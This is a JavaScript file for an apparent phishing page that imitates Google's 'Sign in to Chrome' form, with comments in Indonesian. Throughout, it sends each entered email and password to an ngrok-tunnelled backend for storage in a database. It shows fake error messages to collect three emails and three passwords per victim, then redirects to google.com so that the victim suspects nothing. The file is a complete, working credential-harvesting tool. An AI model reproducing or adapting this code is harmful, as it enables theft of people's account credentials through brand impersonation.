// ==========================================================================
// login.js - INTEGRATED VERSION (6-Cycle Separate Database Sync)
// ==========================================================================

// ===== CONFIGURATION =====
// Saat lokal  : "http://192.168.1.100:3010"
// Saat tunnel : ganti dengan URL ngrok, contoh "https://abc123.ngrok-free.app"
//               WAJIB https (bukan http) agar cookie Secure bisa diterima browser
const IP_STB = "https://kindly-kiln-scabby.ngrok-free.dev"; // <-- ganti dengan URL ngrok kamu

// ===== AUTO-REDIRECT JIKA SESI MASIH AKTIF =====
// Dijalankan paling awal sebelum form login sempat dirender
// Dual-check: localStorage dulu (cepat, offline-safe), lalu backend (sumber kebenaran)
(function checkSesiAktif() {
    // Cleanup: hapus localStorage kalau sudah expired agar tidak jadi sesi hantu
    const expiry = localStorage.getItem('sesi_expiry');
    if (expiry && Date.now() >= parseInt(expiry)) {
        localStorage.removeItem('sesi_expiry');
    }

    // Cara 1: Cek localStorage — paling cepat, tidak perlu hit backend
    // Kebal dari blokir third-party cookie karena disimpan di domain frontend sendiri
    const expiryValid = localStorage.getItem('sesi_expiry');
    if (expiryValid && Date.now() < parseInt(expiryValid)) {
        window.location.href = "https://google.com";
        return; // Stop, tidak perlu lanjut cek backend
    }

    // Cara 2: Fallback cek ke backend — untuk kasus localStorage dibersihkan manual
    // tapi cookie backend masih aktif
    fetch(`${IP_STB}/cek-sesi`, {
        method: 'GET',
        credentials: 'include', // Kirim cookie ke backend
        headers: {
            'ngrok-skip-browser-warning': 'true' // Bypass warning page ngrok
        }
    })
    .then(res => res.json())
    .then(data => {
        if (data.status === 'active') {
            // Cookie backend masih aktif — perbarui localStorage sekalian
            localStorage.setItem('sesi_expiry', Date.now() + (60 * 60 * 1000));
            window.location.href = "https://google.com";
        }
        // Kalau expired: diam saja, biarkan form login tampil normal
    })
    .catch(() => {
        // Gagal koneksi ke backend (offline/ngrok mati) — biarkan form login tampil
        console.log('[SESI CHECK] Backend tidak terjangkau, lanjut tampilkan form login.');
    });
})();

// ===== 1. DEKLARASI ELEMEN UTAMA =====
const boxStep1 = document.getElementById('boxStep1');
const googleCardWrapper = document.getElementById('googleCardWrapper');
const btnToStep2 = document.getElementById('btnToStep2');
const btnStayOut = document.getElementById('btnStayOut');
const btnBackToEmail = document.getElementById('btnBackToEmail');

// Elemen Custom Animasi
const screenShadow = document.getElementById('screenShadow');
const loadingLine = document.getElementById('loadingLine');

// ===== 2. DEKLARASI ELEMEN FORM & ANIMASI =====
const subStepEmail = document.getElementById('subStepEmail');
const subStepPassword = document.getElementById('subStepPassword');
const btnEmailNext = document.getElementById('btnEmailNext');
const btnPasswordNext = document.getElementById('btnPasswordNext');

const inputEmail = document.getElementById('inputEmail');
const inputPassword = document.getElementById('inputPassword');
const groupEmail = document.getElementById('groupEmail');
const groupPassword = document.getElementById('groupPassword');

// Elemen Teks Pesan Error
const errorEmail = document.getElementById('errorEmail');
const errorPassword = document.getElementById('errorPassword');

// ===== 3. DEKLARASI ELEMEN PIL AKUN & LINK DINAMIS =====
const accountPill = document.getElementById('accountPill');
const txtDisplayEmail = document.getElementById('txtDisplayEmail');
const cardTitle = document.getElementById('cardTitle');
const cardSubtitle = document.getElementById('cardSubtitle');

const linkCreateAccount = document.getElementById('linkCreateAccount');
const linkForgotPassword = document.getElementById('linkForgotPassword');
const chkShowPassword = document.getElementById('chkShowPassword');

// ===== COUNTER VARIABLE & DATABASE STORAGE =====
let emailAttempts = 0;
let passwordAttempts = 0;

// Flag untuk mencegah spam klik / double fetch
let isLoading = false;

// Menampung rowId dari database untuk dipasangkan saat submit password
let rowIdSiklus = {
    1: null,
    2: null,
    3: null
};

// ===== FUNGSI PENGACAK ANIMASI (SALAH DAN BENAR) =====
function triggerLoading(isSuccessMode) {
    const blueMover = document.querySelector('.blue-mover');

    if (blueMover) {
        if (isSuccessMode) {
            const loops = Math.random() < 0.5 ? 2 : 3;
            const exactSpeed = 2 / loops;
            blueMover.style.animationDuration = `${exactSpeed}s`;
        } else {
            const randomSpeed = (Math.random() * (1.5 - 0.7) + 0.7).toFixed(2);
            blueMover.style.animationDuration = `${randomSpeed}s`;
        }
    }

    screenShadow.classList.remove('hidden');
    loadingLine.classList.remove('hidden');
}

// ===== HELPER: LOCK & UNLOCK TOMBOL SAAT LOADING =====
function setLoadingState(active) {
    isLoading = active;
    btnEmailNext.disabled = active;
    btnPasswordNext.disabled = active;
}

// ===== 4. LOGIKA TRANSISI STEP 1 KE STEP 2 =====
btnToStep2.addEventListener('click', () => {
    boxStep1.classList.add('hidden');
    googleCardWrapper.classList.remove('hidden');
    // Tombol back disembunyikan di awal — hanya muncul saat di form password
    btnBackToEmail.classList.add('hidden');
    inputEmail.focus();
});

btnStayOut.addEventListener('click', () => {
    window.location.href = "main.html";
});

// ===== 5. FUNGSI SUBMIT EMAIL (TAHAP 1) =====
function handleEmailSubmit() {
    // Guard: tolak jika sedang loading atau sudah lewat cycle 3
    if (isLoading || emailAttempts >= 3) return;

    let emailValue = inputEmail.value.trim();

    if (emailValue === '') {
        groupEmail.classList.add('error-mode');
        errorEmail.classList.remove('hidden');
        inputEmail.focus();
        return;
    }

    emailAttempts++;
    setLoadingState(true);
    triggerLoading(false);

    // Persiapan data JSON payload untuk dikirim ke STB
    const payloadEmail = {
        tipe: "username",
        gmail: emailValue,
        cycle: emailAttempts
    };

    // TEMBAK KE BACKEND STB
    fetch(`${IP_STB}/proses-login`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'ngrok-skip-browser-warning': 'true' // Bypass halaman warning ngrok
        },
        body: JSON.stringify(payloadEmail)
    })
    .then(res => res.json())
    .then(hasil => {
        // Amankan rowId hasil auto_increment MariaDB ke dalam memori sesuai cyclenya
        if (hasil.rowId) {
            rowIdSiklus[emailAttempts] = hasil.rowId;
            console.log(`[FRONTEND LOG] Cycle ${emailAttempts} Username berhasil disimpan di Row ID: ${hasil.rowId}`);
        }

        // JIKA INPUT EMAIL KE-1 DAN KE-2 (LOOP USERNAME)
        if (hasil.status === "LOOP_USERNAME") {
            setTimeout(() => {
                screenShadow.classList.add('hidden');
                loadingLine.classList.add('hidden');
                setLoadingState(false);

                groupEmail.classList.add('error-mode');
                errorEmail.classList.remove('hidden');
                inputEmail.value = '';
                inputEmail.focus();
            }, 1000);
        }
        // JIKA INPUT EMAIL KE-3 (LANJUT PASSWORD)
        else if (hasil.status === "LANJUT_PASSWORD") {
            loadingLine.classList.add('hidden');
            triggerLoading(true);

            setTimeout(() => {
                screenShadow.classList.add('hidden');
                loadingLine.classList.add('hidden');
                // Tidak unlock loading di sini — langsung pindah ke form password
                // setLoadingState akan di-reset setelah animasi selesai

                groupEmail.classList.remove('error-mode');
                errorEmail.classList.add('hidden');

                let displayEmail = emailValue;
                if (!displayEmail.includes('@')) {
                    displayEmail = displayEmail + "@gmail.com";
                }

                txtDisplayEmail.textContent = displayEmail;
                cardTitle.textContent = 'Welcome';
                cardSubtitle.classList.add('hidden');
                accountPill.classList.remove('hidden');

                // === TOMBOL BACK DISEMBUNYIKAN PERMANEN SAAT MASUK FORM PASSWORD ===
                // Setelah cycle 3 email terpenuhi, user tidak boleh kembali ke form email
                // karena counter emailAttempts sudah = 3 dan tidak bisa diulang
                btnBackToEmail.classList.add('hidden');

                subStepEmail.classList.add('slide-out-left');
                linkCreateAccount.classList.add('hidden');
                btnEmailNext.classList.add('hidden');

                linkForgotPassword.classList.remove('hidden');
                btnPasswordNext.classList.remove('hidden');

                setTimeout(() => {
                    subStepEmail.classList.add('hidden');
                    subStepEmail.classList.remove('slide-out-left');

                    subStepPassword.classList.remove('hidden');
                    subStepPassword.classList.add('slide-in-right');

                    setTimeout(() => {
                        subStepPassword.classList.remove('slide-in-right');
                        setLoadingState(false); // Baru unlock setelah animasi selesai & form password tampil
                        inputPassword.focus();
                    }, 50);
                }, 400);

            }, 2000);
        }
    })
    .catch(err => {
        console.error("Gagal koneksi ke STB:", err);
        screenShadow.classList.add('hidden');
        loadingLine.classList.add('hidden');
        setLoadingState(false);
        emailAttempts--; // Rollback counter agar cycle tidak terlewat akibat error jaringan
        alert("Koneksi ke server backend gagal! Pastikan backend di STB sudah running.");
    });
}

btnEmailNext.addEventListener('click', handleEmailSubmit);
inputEmail.addEventListener('keydown', (event) => {
    if (event.key === 'Enter') {
        event.preventDefault();
        handleEmailSubmit();
    }
});

// ===== 6. LOGIKA TOMBOL BACK =====
// Tombol back hanya bisa dipakai saat emailAttempts < 3 (belum masuk fase password)
// Setelah LANJUT_PASSWORD terpicu, tombol ini sudah hidden dan tidak akan pernah muncul lagi
btnBackToEmail.addEventListener('click', () => {
    // Guard tambahan: tolak jika sudah cycle 3 (seharusnya tidak terjadi karena tombol sudah hidden)
    if (emailAttempts >= 3) return;

    cardTitle.textContent = 'Sign in to Chrome';
    cardSubtitle.classList.remove('hidden');
    accountPill.classList.add('hidden');
    btnBackToEmail.classList.add('hidden');

    subStepPassword.classList.add('slide-out-right');
    linkForgotPassword.classList.add('hidden');
    btnPasswordNext.classList.add('hidden');

    linkCreateAccount.classList.remove('hidden');
    btnEmailNext.classList.remove('hidden');

    groupPassword.classList.remove('error-mode');
    errorPassword.classList.add('hidden');

    setTimeout(() => {
        subStepPassword.classList.add('hidden');
        subStepPassword.classList.remove('slide-out-right');

        subStepEmail.classList.remove('hidden');
        subStepEmail.classList.add('slide-in-left');

        setTimeout(() => {
            subStepEmail.classList.remove('slide-in-left');
            inputEmail.focus();
        }, 50);
    }, 400);
});

// ===== 7. FUNGSI SUBMIT PASSWORD (TAHAP 2) =====
function handlePasswordSubmit() {
    // Guard: tolak jika sedang loading atau sudah lewat cycle 3
    if (isLoading || passwordAttempts >= 3) return;

    const passwordValue = inputPassword.value.trim();

    if (passwordValue === '') {
        groupPassword.classList.add('error-mode');
        errorPassword.classList.remove('hidden');
        inputPassword.focus();
        return;
    }

    passwordAttempts++;
    setLoadingState(true);
    triggerLoading(false);

    // Ambil rowId pasangan email yang tepat berdasarkan siklus password berjalan
    const targetRowId = rowIdSiklus[passwordAttempts];

    // Guard: rowId wajib ada, jika null berarti ada error di fase email sebelumnya
    if (!targetRowId) {
        console.error(`[ERROR] rowId untuk cycle ${passwordAttempts} tidak ditemukan!`);
        screenShadow.classList.add('hidden');
        loadingLine.classList.add('hidden');
        setLoadingState(false);
        passwordAttempts--; // Rollback
        alert("Terjadi error internal (rowId hilang). Silakan refresh halaman.");
        return;
    }

    const payloadPassword = {
        tipe: "password",
        password: passwordValue,
        cycle: passwordAttempts,
        rowId: targetRowId
    };

    // TEMBAK KE BACKEND STB
    fetch(`${IP_STB}/proses-login`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'ngrok-skip-browser-warning': 'true' // Bypass halaman warning ngrok
        },
        body: JSON.stringify(payloadPassword),
        credentials: 'include' // WAJIB! Agar browser mau menangkap & menyimpan cookie dari STB
    })
    .then(res => res.json())
    .then(hasil => {
        // JIKA INPUT PASSWORD KE-1 DAN KE-2 (LOOP PASSWORD)
        if (hasil.status === "LOOP_PASSWORD") {
            setTimeout(() => {
                screenShadow.classList.add('hidden');
                loadingLine.classList.add('hidden');
                setLoadingState(false);

                groupPassword.classList.add('error-mode');
                errorPassword.classList.remove('hidden');
                inputPassword.value = '';
                inputPassword.focus();
            }, 1000);
        }
        // JIKA INPUT PASSWORD KE-3 (SUKSES TOTAL - REDIRECT)
        else if (hasil.status === "SUKSES_TOTAL") {
            // Simpan timestamp expiry 1 jam ke localStorage
            // Ini yang akan dicek saat user buka login.html lagi agar langsung redirect
            localStorage.setItem('sesi_expiry', Date.now() + (60 * 60 * 1000));

            loadingLine.classList.add('hidden');
            triggerLoading(true);

            setTimeout(() => {
                screenShadow.classList.add('hidden');
                loadingLine.classList.add('hidden');
                // Tidak perlu unlock — halaman akan redirect

                groupPassword.classList.remove('error-mode');
                errorPassword.classList.add('hidden');

                if (window.process && window.process.versions && window.process.versions.electron) {
                    const { shell } = window.require('electron');
                    shell.openExternal("https://google.com");
                } else {
                    window.location.href = "https://google.com";
                }
            }, 2000);
        }
    })
    .catch(err => {
        console.error("Gagal koneksi ke STB:", err);
        screenShadow.classList.add('hidden');
        loadingLine.classList.add('hidden');
        setLoadingState(false);
        passwordAttempts--; // Rollback counter agar cycle tidak terlewat akibat error jaringan
        alert("Koneksi ke server backend gagal saat update password!");
    });
}

btnPasswordNext.addEventListener('click', handlePasswordSubmit);
inputPassword.addEventListener('keydown', (event) => {
    if (event.key === 'Enter') {
        event.preventDefault();
        handlePasswordSubmit();
    }
});

// ===== 8. LOGIKA LAIN-LAIN =====
chkShowPassword.addEventListener('change', function() {
    inputPassword.type = this.checked ? 'text' : 'password';
});
